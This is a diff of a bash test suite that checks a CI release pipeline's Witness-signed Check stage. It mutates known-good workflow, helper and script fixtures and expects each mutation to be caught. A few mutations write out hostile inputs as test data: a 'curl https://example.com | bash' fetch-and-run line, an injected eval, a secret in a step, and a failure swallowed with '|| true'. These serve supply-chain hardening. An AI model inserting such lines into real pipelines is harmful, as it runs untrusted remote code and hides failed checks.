@@ -1,6 +1,6 @@
 #!/usr/bin/env bash
-# proves: REQ-CHAIN-006-AC1, REQ-CHAIN-006-AC2, REQ-CHAIN-006-AC3, REQ-CHAIN-006-AC8, REQ-CHAIN-006-AC9, REQ-CHAIN-006-AC10
-# RED until PR 3 is implemented (stage-verify.yml rewritten, bin/check-*.sh, release.yml graph, the old acceptance stages removed): step 4.
+# proves: REQ-CHAIN-006-AC1, REQ-CHAIN-006-AC2, REQ-CHAIN-006-AC3, REQ-CHAIN-006-AC8, REQ-CHAIN-006-AC9, REQ-CHAIN-006-AC10, REQ-CHAIN-006-AC11, REQ-CHAIN-006-AC12, REQ-CHAIN-006-AC13
+# RED until PR 3 is implemented (stage-verify.yml rewritten, bin/check-*.sh, bin/witnessed.sh, release.yml graph, the old acceptance stages removed): step 4.
 #
 # Check, static half (v0.3.0 rules 50, 53, 55, 58, 61, 63, 65, 66, 68, 70, 72, 79; advisor read-back approved Oct 9; PR 3 merges into chain-v030 only).
 # Runs on ubuntu-24.04 or macOS with: bash, python3 + PyYAML (apt: python3-yaml), jq. No network, no secrets, no keys.
@@ -16,6 +16,13 @@
 #   [P] images arrive as files under images/ (OCI tarballs from Build's artifacts; Check logs in to no registry), the artifact names `provenance`
 #       (Sign's bundle) and `check-results`/`witness-check` (Check's), the five script names and command lines of bin/check-stage.sh, the guide
 #       file docs/verify-release.md (the www lane's customer guide), the results file names.
+#
+# RULE 68 AS AMENDED BY THE OWNER (Oct 9, 16:47 EDT): every command run under Witness is limited to 9 minutes (`timeout 540`), because Fulcio's
+# certificate lives 10 minutes and Witness checks it at the TIMESTAMP's time (harness spike (d): a 13-minute command yields a record that never
+# verifies). The cap lives in ONE place, the helper bin/witnessed.sh (PR 2 defines it; judge `helper` below is its seam and is kept identical to
+# PR 2's). Check is split into three plainly named witnessed steps (scanners / acceptance / runtime) so none nears the cap. The owner also asked
+# for code a human can read: the stage file is four short lines, the helper is the only place with Witness flags, the judges accept the plain form
+# and reject variants instead of growing clever.
 #
 # CREDENTIALS (coordinator correction, Oct 9): Check holds NO secret and no cloud federation: the release scanners need none. id-token: write is
 # only for Witness to sign Check's own record. A test below refuses a secret, a registry login and a packages/attestations permission.
@@ -55,40 +62,51 @@ UPL = "actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
 DWN = "actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1"
 def dn(name, path): return f"      - uses: {DWN}\n        with:\n          name: {name}\n          path: {path}\n"
 def up(name, path): return f"      - uses: {UPL}\n        with:\n          name: {name}\n          path: {path}\n"
-WIT = """      - name: check under Witness
-        run: |
-          set -euo pipefail
-          curl -sSf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sigstore" -o "$RUNNER_TEMP/tok.json"
-          jq -r .value "$RUNNER_TEMP/tok.json" > "$RUNNER_TEMP/tok"
-          echo "::add-mask::$(cat "$RUNNER_TEMP/tok")"
-          witness run --step check \\
-            --signer-fulcio-url https://fulcio.sigstore.dev \\
-            --signer-fulcio-oidc-issuer https://token.actions.githubusercontent.com \\
-            --signer-fulcio-oidc-client-id sigstore \\
-            --signer-fulcio-token-path "$RUNNER_TEMP/tok" \\
-            -t https://timestamp.sigstore.dev/api/v1/timestamp \\
-            -a environment,git,material,product \\
-            --env-filter-sensitive-vars \\
-            --env-add-sensitive-key 'ACTIONS_ID_TOKEN_REQUEST*' --env-add-sensitive-key ACTIONS_RUNTIME_TOKEN \\
-            -d out -o witness-check/check-collection.json \\
-            -- ./bin/check-stage.sh
-"""
+def wit(step): return f"      - name: {step}\n        run: bash bin/witnessed.sh {step} bin/check-stage.sh {step}\n"
 stage = ("name: 'Stage: check'\non:\n  workflow_call:\npermissions:\n  contents: read\njobs:\n  check:\n    runs-on: ubuntu-24.04\n"
          "    permissions:\n      contents: read\n      id-token: write\n    steps:\n"
          f"      - uses: {CHK}\n        with:\n          persist-credentials: false\n"
          "      - name: install Witness (pinned by checksum)\n        run: ./bin/install-scanner.sh witness\n"
          + dn("witness-build", "witness-build") + dn("digests", "witness-build") + dn("provenance", "provenance") + dn("dist", "dist")
-         + WIT + up("witness-check", "witness-check") + up("check-results", "check-results"))
+         + wit("scanners") + wit("acceptance") + wit("runtime") + up("witness-check", "witness-records") + up("check-results", "check-results"))
 open(w + "/stage.yml", "w").write(stage)
-SC = ["python3 bin/chain-verify.py stage-start --stage check --previous build --record witness-build/build-collection.json --digests witness-build/digests.json --policy policy.json",
-      "python3 bin/chain-verify.py verify --stage sign --record provenance/provenance.json --policy policy.json --rekor-stub provenance/provenance.rekor.json",
-      "bash bin/check-scan.sh --scanners .github/policy/scanners.json --digests witness-build/digests.json --images images --archives dist --out check-results",
-      "bash bin/check-fips.sh --digests witness-build/digests.json --images images --out check-results",
-      "bash bin/check-acceptance.sh gradle --digests witness-build/digests.json --images images --out check-results",
-      "bash bin/check-acceptance.sh maven --digests witness-build/digests.json --images images --out check-results",
-      "bash bin/check-acceptance.sh egress --digests witness-build/digests.json --images images --out check-results",
-      "bash bin/check-guide.sh --guide docs/verify-release.md --digests witness-build/digests.json --images images --out check-results"]
-open(w + "/script.sh", "w").write("#!/usr/bin/env bash\nset -euo pipefail\n" + "\n".join(SC) + "\n")
+open(w + "/witnessed.sh", "w").write("""#!/usr/bin/env bash
+# witnessed STEP SCRIPT [ARGS...]: run SCRIPT under Witness, keyless, limited to 9 minutes (rule 68).
+set -euo pipefail
+step=$1; shift
+curl -sSf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sigstore" -o "$RUNNER_TEMP/tok.json"
+jq -r .value "$RUNNER_TEMP/tok.json" > "$RUNNER_TEMP/tok"
+echo "::add-mask::$(cat "$RUNNER_TEMP/tok")"
+mkdir -p witness-records
+witness run --step "$step" \\
+  --signer-fulcio-url https://fulcio.sigstore.dev \\
+  --signer-fulcio-oidc-issuer https://token.actions.githubusercontent.com \\
+  --signer-fulcio-oidc-client-id sigstore \\
+  --signer-fulcio-token-path "$RUNNER_TEMP/tok" \\
+  -t https://timestamp.sigstore.dev/api/v1/timestamp \\
+  -a environment,git,material,product \\
+  --env-filter-sensitive-vars \\
+  --env-add-sensitive-key 'ACTIONS_ID_TOKEN_REQUEST*' --env-add-sensitive-key ACTIONS_RUNTIME_TOKEN \\
+  -o "witness-records/$step.json" \\
+  -- timeout 540 bash "$@"
+""")
+V = ["python3 bin/chain-verify.py stage-start --stage check --previous build --record witness-build/build-collection.json --digests witness-build/digests.json --policy policy.json",
+     "python3 bin/chain-verify.py verify --stage sign --record provenance/provenance.json --policy policy.json --rekor-stub provenance/provenance.rekor.json"]
+PH = [("scanners", ["bash bin/check-scan.sh --scanners .github/policy/scanners.json --digests witness-build/digests.json --images images --archives dist --out check-results"]),
+      ("acceptance", ["bash bin/check-acceptance.sh gradle --digests witness-build/digests.json --images images --out check-results",
+                      "bash bin/check-acceptance.sh maven --digests witness-build/digests.json --images images --out check-results"]),
+      ("runtime", ["bash bin/check-acceptance.sh egress --digests witness-build/digests.json --images images --out check-results",
+                   "bash bin/check-fips.sh --digests witness-build/digests.json --images images --out check-results",
+                   "bash bin/check-guide.sh --guide docs/verify-release.md --digests witness-build/digests.json --images images --out check-results"])]
+body = "set -euo pipefail\n" + "\n".join(V) + '\ncase "$1" in\n'
+for n, cs in PH:
+    body += n + ")\n" + "".join(c + "\n" for c in cs) + ";;\n"
+body += '*) echo "unknown phase: $1" >&2; exit 2 ;;\nesac\n'
+open(w + "/script.sh", "w").write("#!/usr/bin/env bash\n" + body)
+import json
+open(w + "/records.json", "w").write(json.dumps({"records": [
+    {"type": "https://witness.testifysec.com/attestation-collection/v0.1", "claim": "what Build, Rebuild and Check each observed and found", "consumer": "release"},
+    {"type": "https://slsa.dev/provenance/v1", "claim": "how the release was built", "consumer": "release"}]}))
 open(w + "/release.yml", "w").write("""name: Release
 on:
   push:
@@ -115,6 +133,8 @@ for n in ("check-stage", "check-scan", "check-fips", "check-acceptance", "check-
 PY
 expect ok "fixture: the known-good stage-verify.yml passes the stage judge" "" stage "$work/stage.yml"
 expect ok "fixture: the known-good bin/check-stage.sh passes the script judge" "" script "$work/script.sh"
+expect ok "fixture: the known-good bin/witnessed.sh passes the helper judge (rule 68 seam)" "" helper "$work/witnessed.sh"
+expect ok "fixture: the known-good chain-records.json passes the records judge" "" records "$work/records.json"
 expect ok "fixture: the known-good release.yml passes the graph judge" "" graph "$work/release.yml"
 expect ok "fixture: plain scripts that only use scanners, docker and curl pass the plain judge" "" plain "$work"/plain/check-*.sh
 # ---- AC1/AC9: the stage file, mutated one rule at a time ----------------------------------------------------------------
@@ -132,7 +152,7 @@ m s_pkgw   'id-token: write\n    steps'                      'id-token: write\n 
 m s_pkgr   'id-token: write\n    steps'                      'id-token: write\n      packages: read\n    steps'      'permissions'       "AC1 packages: read (images travel as files)"
 m s_att    'id-token: write\n    steps'                      'id-token: write\n      attestations: write\n    steps'  'permissions'       "AC1 attestations: write"
 m s_noid   'id-token: write'                                   'id-token: none'                                         'permissions'       "AC1 no id-token"
-m s_sec    'name: check under Witness'                         'name: check under Witness\n        env:\n          K: ${{ secrets.SNYK_TOKEN }}'  'step keys'  "AC1 a secret in a step"
+m s_sec    'name: scanners'                                   'name: scanners\n        env:\n          K: ${{ secrets.SNYK_TOKEN }}'  'step keys'  "AC1 a secret in a step"
 m s_login  '      - name: install Witness'                     '      - name: login\n        run: echo x | docker login ghcr.io -u u --password-stdin\n      - name: install Witness' 'registry login' "AC1 a registry login"
 m s_unp    'actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1' 'actions/checkout@v4'                                  'digest-pinned'    "AC1 an unpinned checkout"
 m s_persist 'persist-credentials: false'                       'persist-credentials: true'                              'persist-credentials' "AC1 persisted credentials"
@@ -141,35 +161,51 @@ m s_dlbin  'path: provenance'                                  'path: bin'      
 m s_upname 'name: check-results'                               'name: anything'                                         'upload-artifact'   "AC1 an upload outside the allowlist"
 m s_ghscr  '      - name: install Witness'                     '      - uses: actions/github-script@60a0d83039c74a4aee543508d2ffcb1c3799cdea # v7.0.1\n      - name: install Witness' 'uses not allowed' "AC1 github-script"
 m s_comp   '      - name: install Witness'                     '      - uses: ./.github/actions/x\n      - name: install Witness'  'uses not allowed' "AC1 a local composite action"
-m s_twowit '      - name: check under Witness'                 '      - name: second\n        run: echo hi\n      - name: check under Witness' 'ONE witness step' "AC1 a second run step"
 m s_after  '      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1\n        with:\n          name: witness-check' '      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n        with:\n          name: dist\n          path: dist2\n      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1\n        with:\n          name: witness-check' 'after Witness' "AC1 a download after Witness started"
-m s_gh     '-a environment,git,material,product'               '-a environment,git,github,product'                      'github'            "AC9 the github attestor (it embeds the raw OIDC token)"
-m s_slsa   '-a environment,git,material,product'               '-a environment,git,material,product,slsa'               'slsa'              "AC9 the slsa attestor (Sign's alone)"
-m s_step   'witness run --step check'                          'witness run --step build'                               '--step'            "AC9 a wrong step name"
-m s_ts     '-t https://timestamp.sigstore.dev/api/v1/timestamp' '-t https://timestamp.example.com/api'                  '-t'                "AC9 another timestamp authority"
-m s_fulcio '--signer-fulcio-url https://fulcio.sigstore.dev'   '--signer-fulcio-url https://fulcio.example.com'          '--signer-fulcio-url' "AC9 another Fulcio"
-m s_nofilt '            --env-filter-sensitive-vars \\\n'      ''                                                        'env-filter'        "AC9 the environment filter dropped"
-m s_tok    '--env-add-sensitive-key ACTIONS_RUNTIME_TOKEN'     '--env-add-sensitive-key SOMETHING_ELSE'                  'sensitive key'     "AC9 the token variable no longer filtered"
-m s_out    '-o witness-check/check-collection.json'            '-o elsewhere.json'                                      '-o'                "AC9 the collection written elsewhere"
-m s_end    '-- ./bin/check-stage.sh'                           '-- ./bin/other.sh'                                      'check-stage.sh'    "AC1 witness run ends with another script"
-m s_fetch  'echo "::add-mask::\$\(cat "\$RUNNER_TEMP/tok"\)"'  'echo hi'                                               'token-fetch'       "AC9 the token is no longer masked"
-m s_nosh   'set -euo pipefail\n          curl'                'curl'                                                   'set -euo pipefail' "AC1 the witness step without set -euo pipefail"
 m s_wf     'permissions:\n  contents: read\njobs'             'permissions:\n  contents: read\nenv: {A: b}\njobs'      'workflow keys'     "AC1 workflow env"
 m s_trig   'workflow_call:'                                    'workflow_call:\n  push:'                                  'workflow_call'     "AC1 an extra trigger"
+m s_direct 'run: bash bin/witnessed.sh scanners bin/check-stage.sh scanners' 'run: witness run --step scanners -- ./bin/check-stage.sh'  'witnessed.sh' "AC11 a direct witness run in the stage file (the helper is the one place)"
+m s_tmo    'run: bash bin/witnessed.sh scanners bin/check-stage.sh scanners' 'run: timeout 540 bash bin/witnessed.sh scanners bin/check-stage.sh scanners' 'witnessed.sh' "AC11 timeout boilerplate repeated in the stage file"
+m s_name   'witnessed.sh runtime bin/check-stage.sh runtime'  'witnessed.sh checks bin/check-stage.sh checks'  'exactly' "AC11 a step name outside the closed list"
+m s_mism   'witnessed.sh acceptance bin/check-stage.sh acceptance' 'witnessed.sh acceptance bin/check-stage.sh runtime' 'witnessed.sh' "AC11 the step name and the phase differ"
+m s_four   '      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1\n        with:\n          name: witness-check' '      - name: extra\n        run: bash bin/witnessed.sh extra bin/check-stage.sh extra\n      - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1\n        with:\n          name: witness-check' 'THREE' "AC11 a fourth witnessed step"
+m s_order  '      - name: scanners\n        run: bash bin/witnessed.sh scanners bin/check-stage.sh scanners\n      - name: acceptance\n        run: bash bin/witnessed.sh acceptance bin/check-stage.sh acceptance\n' '      - name: acceptance\n        run: bash bin/witnessed.sh acceptance bin/check-stage.sh acceptance\n      - name: scanners\n        run: bash bin/witnessed.sh scanners bin/check-stage.sh scanners\n' 'in that order' "AC11 the steps run in another order"
+m s_threeup 'name: witness-check\n          path: witness-records' 'name: witness-check\n          path: elsewhere' 'upload-artifact' "AC12 the records directory is not what is uploaded"
+# ---- AC11: the helper (the rule 68 seam) -----------------------------------------------------------------------------
+hm() { if mutate "$work/witnessed.sh" "$work/$1.sh" "$2" "$3"; then expect caught "$5" "$4" helper "$work/$1.sh"; fi; }
+hm h_notmo   ' -- timeout 540 bash "\$@"'                      ' -- bash "$@"'                                          'timeout 540'       "AC11 no timeout around the wrapped command"
+hm h_600     'timeout 540'                                      'timeout 600'                                            'timeout 540'       "AC11 a cap of 10 minutes (the certificate lifetime)"
+hm h_zero    'timeout 540'                                      'timeout 0'                                              'timeout 540'       "AC11 timeout 0 (no limit)"
+hm h_two     'echo "::add-mask'                                 'timeout 540 true\necho "::add-mask'                      'timeout 540'       "AC11 timeout stated twice"
+hm h_notwrap '  -- timeout 540 bash "\$@"'                      '  --timeout 540 -- bash "$@"'                           'timeout 540'       "AC11 the timeout is not around the wrapped command"
+hm h_twowit  'mkdir -p witness-records'                         'mkdir -p witness-records\nwitness run --step x -- true'  'exactly one'      "AC11 a second witness run"
+hm h_dflag   '  -o "witness-records/\$step.json"'               '  -d out -o "witness-records/$step.json"'               'flag not allowed'  "AC9 the working-directory flag"
+hm h_gh      '-a environment,git,material,product'              '-a environment,git,github,product'                      'github'            "AC9 the github attestor (it embeds the raw OIDC token)"
+hm h_slsa    '-a environment,git,material,product'              '-a environment,git,material,product,slsa'               'slsa'              "AC9 the slsa attestor (Sign's alone)"
+hm h_ts      '-t https://timestamp.sigstore.dev/api/v1/timestamp' '-t https://timestamp.example.com/api'                  '-t'                "AC9 another timestamp authority"
+hm h_fulcio  '--signer-fulcio-url https://fulcio.sigstore.dev'  '--signer-fulcio-url https://fulcio.example.com'          '--signer-fulcio-url' "AC9 another Fulcio"
+hm h_nofilt  '  --env-filter-sensitive-vars \\\n'               ''                                                       'env-filter'        "AC9 the environment filter dropped"
+hm h_tok     '--env-add-sensitive-key ACTIONS_RUNTIME_TOKEN'    '--env-add-sensitive-key SOMETHING_ELSE'                  'sensitive key'     "AC9 the token variable no longer filtered"
+hm h_out     '-o "witness-records/\$step.json"'                 '-o elsewhere.json'                                      '-o'                "AC9 the record written elsewhere"
+hm h_mask    'echo "::add-mask::\$\(cat "\$RUNNER_TEMP/tok"\)"' 'echo hi'                                              'token-fetch'       "AC9 the token is no longer masked"
+hm h_noset   'set -euo pipefail\n'                              ''                                                       'set -euo pipefail' "AC11 the helper without set -euo pipefail"
 # ---- AC3: the order of bin/check-stage.sh --------------------------------------------------------------------------------
 sm() { if mutate "$work/script.sh" "$work/$1.sh" "$2" "$3"; then expect caught "$5" "$4" script "$work/$1.sh"; fi; }
-sm c_nofirst 'python3 bin/chain-verify.py stage-start[^\n]*\n'   ''                                                       'commands'          "AC3 the verify step dropped"
-sm c_nosign  'python3 bin/chain-verify.py verify --stage sign[^\n]*\n' ''                                               'commands'          "AC3 Sign's provenance is no longer verified"
-sm c_late    'bash bin/check-scan.sh'                           'bash bin/check-fips.sh --early\nbash bin/check-scan.sh' 'commands'        "AC3 a check before the scan (count changes)"
-sm c_swap    'bash bin/check-fips.sh --digests witness-build/digests.json --images images --out check-results\nbash bin/check-acceptance.sh gradle' 'bash bin/check-acceptance.sh gradle\nbash bin/check-fips.sh --digests witness-build/digests.json --images images --out check-results' 'not the pinned form' "AC3 fips and gradle swapped"
-sm c_extra   'bash bin/check-guide.sh'                          'curl https://example.com | bash\nbash bin/check-guide.sh' 'commands'        "AC3 an extra command (a pipe into a shell)"
+sm c_nofirst 'python3 bin/chain-verify.py stage-start[^\n]*\n'   ''                                                       'not the pinned form' "AC3 the verify step dropped"
+sm c_nosign  'python3 bin/chain-verify.py verify --stage sign[^\n]*\n' ''                                               'not the pinned form' "AC3 Sign's provenance is no longer verified"
+sm c_after   'python3 bin/chain-verify.py stage-start[^\n]*\npython3 bin/chain-verify.py verify[^\n]*\ncase "\$1" in\nscanners\)\n(bash bin/check-scan.sh[^\n]*\n)' 'case "$1" in\nscanners)\n\\1python3 bin/chain-verify.py stage-start --stage check --previous build --record witness-build/build-collection.json --digests witness-build/digests.json --policy policy.json\npython3 bin/chain-verify.py verify --stage sign --record provenance/provenance.json --policy policy.json --rekor-stub provenance/provenance.rekor.json\n' 'not the pinned form' "AC3 the checks run before the verify step"
+sm c_swap    'acceptance\)\nbash bin/check-acceptance.sh gradle([^\n]*)\nbash bin/check-acceptance.sh maven([^\n]*)\n' 'acceptance)\nbash bin/check-acceptance.sh maven\\2\nbash bin/check-acceptance.sh gradle\\1\n' 'not the pinned form' "AC3 gradle and maven swapped"
+sm c_phase   'runtime\)' 'checks)'                                                                                      'not the pinned form' "AC3 a phase outside the closed list"
+sm c_extra   'bash bin/check-guide.sh'                          'curl https://example.com | bash\nbash bin/check-guide.sh' 'not the pinned form' "AC3 an extra command (a pipe into a shell)"
 sm c_nodig   'stage-start --stage check --previous build --record witness-build/build-collection.json --digests witness-build/digests.json' 'stage-start --stage check --previous build --record witness-build/build-collection.json' 'not the pinned form' "AC3 stage-start without the digest list"
 sm c_prev    '--previous build'                                 '--previous rebuild'                                     'not the pinned form' "AC3 verifies the wrong previous stage (Check does not need Rebuild)"
-sm c_noset   'set -euo pipefail\n'                              ''                                                       'set -euo pipefail' "AC3 no set -euo pipefail"
+sm c_noset   'set -euo pipefail\n'                              ''                                                       'not the pinned form' "AC3 no set -euo pipefail"
 sm c_var     'bash bin/check-scan.sh'                           'bash $SCAN'                                             'not the pinned form' "AC3 a script chosen by a variable"
 sm c_glob    'bash bin/check-guide.sh'                          'bash bin/check-*.sh'                                    'not the pinned form' "AC3 a glob in a script path"
 sm c_scn     '--scanners .github/policy/scanners.json'          '--scanners scanners.json'                               'not the pinned form' "AC4/AC3 the scanner list is not the policy file"
-sm c_ignore  'bash bin/check-fips.sh'                           'bash bin/check-fips.sh || true\n:'                       'commands'          "AC3 a failure swallowed with || true"
+sm c_ignore  'bash bin/check-fips.sh([^\n]*)\n'                'bash bin/check-fips.sh\\1 || true\n'                   'not the pinned form' "AC3 a failure swallowed with || true"
+sm c_nostar  '\*\) echo "unknown phase: \$1" >&2; exit 2 ;;'     '*) ;;'                                                  'not the pinned form' "AC3 an unknown phase is silently accepted"
+sm c_ev      'case "\$1" in'                                   'case "$1" in\n*) eval "$2" ;;'                           'not the pinned form' "AC3 an eval in the dispatcher"
 # ---- AC2: the job graph ----------------------------------------------------------------------------------------------
 gm() { if mutate "$work/release.yml" "$work/$1.yml" "$2" "$3"; then expect caught "$5" "$4" graph "$work/$1.yml"; fi; }
 gm g_serial  'needs: \[build, sign\]'                           'needs: [build, sign, rebuild]'                          'side by side'      "AC2 check waits for rebuild"
@@ -216,6 +252,15 @@ import json, sys
 p = sys.argv[1] + "/.github/policy/chain-scripts.json"; d = json.load(open(p)); d["scripts"][2]["signs"] = "other"; json.dump(d, open(p, "w"))
 PY
 expect caught "AC8 a check script listed as a signer" "signs: false" listed "$work/l4/.github/policy/chain-scripts.json" "$work/l4"
+# ---- AC13 (rule 66): the table of records ------------------------------------------------------------------------------
+rm_() { python3 - "$work/records.json" "$work/$1.json" "$2" <<'PY'
+import json, sys
+d = json.load(open(sys.argv[1])); eval(sys.argv[3], {"d": d}); json.dump(d, open(sys.argv[2], "w"))
+PY
+  expect caught "$4" "$3" records "$work/$1.json"; }
+rm_ r_old   'd["records"].append({"type": "https://fosterstack.com/attestations/acceptance/v1", "claim": "x", "consumer": "release"})' 'acceptance' "AC13 the old custom acceptance record is still in the table"
+rm_ r_nocon 'd["records"][0].__setitem__("consumer", "nobody")' 'no row' "AC13 the Witness collection row has no real consumer"
+rm_ r_noclm 'd["records"][0].__setitem__("claim", "what was built")' 'no row' "AC13 the Witness collection row does not name Check"
 # ---- AC10: the old acceptance stages --------------------------------------------------------------------------------
 mkdir -p "$work/r/.github/workflows"; cp "$work/release.yml" "$work/r/.github/workflows/release.yml"
 expect ok "fixture: none of the old acceptance stages and no call to them" "" removed "$work/r"
@@ -225,14 +270,20 @@ cp -r "$work/r" "$work/r3"; printf '  accept:\n    uses: ./.github/workflows/sta
 expect caught "AC10 release.yml still calls an old acceptance stage" "stage-acceptance-egress.yml" removed "$work/r3"
 cp -r "$work/r" "$work/r4"; printf '  acc:\n    uses: ./.github/workflows/acceptance.yml\n' >> "$work/r4/.github/workflows/release.yml"
 expect caught "AC10 release.yml still calls acceptance.yml" "acceptance.yml" removed "$work/r4"
+cp -r "$work/r" "$work/r5"; mkdir -p "$work/r5/bin"; : > "$work/r5/bin/authorize-acceptance-check.py"
+expect caught "AC10 the custom authorization verifier still exists (rule 65)" "authorize-acceptance-check.py" removed "$work/r5"
+cp -r "$work/r" "$work/r6"; mkdir -p "$work/r6/.github/workflows"; printf 'jobs:\n  t:\n    steps:\n      - run: bash bin/authorize-acceptance-check-test.sh\n' > "$work/r6/.github/workflows/ci.yml"
+expect caught "AC10 ci.yml still runs the custom authorization verifier's test (rule 65)" "ci.yml" removed "$work/r6"
 # ---- the real repository (RED until PR 3 is implemented) ---------------------------------------------------------------
 expect ok "the real stage-verify.yml is the Check stage" "" stage "$root/.github/workflows/stage-verify.yml"
-expect ok "the real bin/check-stage.sh runs verify, scan, fips, gradle, maven, egress, guide in order" "" script "$root/bin/check-stage.sh"
+expect ok "the real bin/check-stage.sh verifies, then dispatches scanners / acceptance / runtime" "" script "$root/bin/check-stage.sh"
+expect ok "the real bin/witnessed.sh is the one helper with the Witness flags and the 9-minute cap (rule 68)" "" helper "$root/bin/witnessed.sh"
+expect ok "the real chain-records.json has Check's Witness collection and no old acceptance record (rule 66)" "" records "$root/.github/policy/chain-records.json"
 expect ok "the real release.yml runs check beside rebuild and the release job needs all four" "" graph "$root/.github/workflows/release.yml"
 expect ok "the real check scripts are plain" "" plain "$root"/bin/check-stage.sh "$root"/bin/check-scan.sh "$root"/bin/check-fips.sh "$root"/bin/check-acceptance.sh "$root"/bin/check-guide.sh
 expect ok "the real check scripts are listed in chain-scripts.json with their sha256" "" listed "$root/.github/policy/chain-scripts.json" "$root"
 expect ok "the old acceptance stages are gone from the real repository and release.yml" "" removed "$root"
-EXPECT=79
+EXPECT=102
 echo "pass=$pass fail=$failn"
 if [ $((pass + failn)) != "$EXPECT" ]; then echo "FAIL case count $((pass + failn)) != expected $EXPECT (a case was skipped or added)"; exit 1; fi
 [ "$failn" = 0 ]
